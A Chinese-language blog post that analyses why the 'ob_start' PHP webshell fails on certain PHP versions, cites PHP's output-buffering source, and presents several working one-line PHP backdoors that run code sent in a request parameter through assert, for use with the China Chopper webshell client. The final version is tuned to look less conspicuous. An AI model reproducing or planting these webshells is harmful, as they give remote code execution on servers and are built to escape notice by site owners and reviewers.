---
layout:     post
title:      ob_start用于菜刀的可行性分析
category: blog
description: php ob_start webshell
---

传统的ob_start马是这样用：

    <?php
    ob_start('assert'); 
    echo $_REQUEST['pass']; 
    ob_end_flush();
    ?>
经过本人测试这种方法在PHP5.4.X以上版本可以执行代码，但没有任何回显，当然也就不能用于菜刀，那么究竟是什么原因导致的不能回显呢？

分析
ob_start(“assert”)的意思设置assert作为ob操作结束时回调函数，ob_start要求回调函数接收两个参数，而在PHP 5.4.8以下版本assert只接受一个参数，所以5.3.X这样用都不能成功执行代码。恰好本人在做一个基于污点跟踪的webshell监控的玩意，测试这个时候始终不能执行，百思不得其解之后发现是版本问题，汗
5.4.8以上版本的PHP可以成功执行，但是assert执行内容不能有print/echo等ob输出，看PHP源代码找到原因：
> main\output.c

    PHPAPI void php_end_ob_buffer(zend_bool send_buffer, zend_bool just_flush TSRMLS_DC)
    {
    …
    
    OG(ob_lock) = 1;  //调用回调之前设置ob_lock
    //下面就是去调用回调函数
    if (call_user_function_ex(CG(function_table), NULL, OG(active_ob_buffer).output_handler, &alternate_buffer, 2, params, 1, NULL TSRMLS_CC)==SUCCESS) {
      if (alternate_buffer && !(Z_TYPE_P(alternate_buffer)==IS_BOOL && Z_BVAL_P(alternate_buffer)==0)) {
    convert_to_string_ex(&alternate_buffer);
    final_buffer = Z_STRVAL_P(alternate_buffer);
    final_buffer_length = Z_STRLEN_P(alternate_buffer);
      }
    }
    OG(ob_lock) = 0;
而在

    PHPAPI int php_start_ob_buffer(zval *output_handler, uint chunk_size, zend_bool erase TSRMLS_DC)
    {
      uint initial_size, block_size;
    
      if (OG(ob_lock)) {  //判断是否设置ob_lock
    if (SG(headers_sent) && !SG(request_info).headers_only) {
      OG(php_body_write) = php_ub_body_write_no_header;
    } else {
      OG(php_body_write) = php_ub_body_write;
    }
    OG(ob_nesting_level) = 0;
    //在回调之中调用ob相关函数会引发FATAL ERROR
    php_error_docref("ref.outcontrol" TSRMLS_CC, E_ERROR, "Cannot use output buffering in output buffering display handlers");
    return FAILURE;
      }
可以看到一旦使用了print/echo等等输出函数，就会调用php_start_ob_buffer，而php_start_ob_buffer中判断了是不能在display handlers中使用ob的，一旦使用就会造成Fatal error。所以想在菜刀中那样使用ob_start不仅仅是不输出的问题，而是压根就不能成功执行。PHP这样设计的原因是显而易见的，在输出回调中再去输出会造成死循环。

解决
所以要通用的在各版本使用ob_start回调，就不能在ob回调函数中去执行eval/assert，因此用以下这种方案：

    <?php
    $evalstr="";
    function myeval($c,$d)
    {
    global $evalstr;
    $evalstr=$c;
    }
    ob_start('myeval');
    echo $_REQUEST['pass'];
    ob_end_flush();
    assert($evalstr);
    ?>
但是这样代码太长不好看，PHP5.3以上支持闭包可以使用以下方案：

    <?php
    $evalstr="";
    ob_start(function ($c,$d){global $evalstr;$evalstr=$c;});
    echo $_REQUEST['pass'];
    ob_end_flush();
    assert($evalstr);
    ?>
但是直接调用了assert还是太显眼不完美，于是再改进，使用register_shutdown_function：

    <?php
    ob_start(function ($c,$d){register_shutdown_function('assert',$c);});
    echo $_REQUEST['pass'];
    ob_end_flush();
    ?>
这个最终版本看上去顺眼多了。
注：以上代码在PHP5.3.3中测试成功。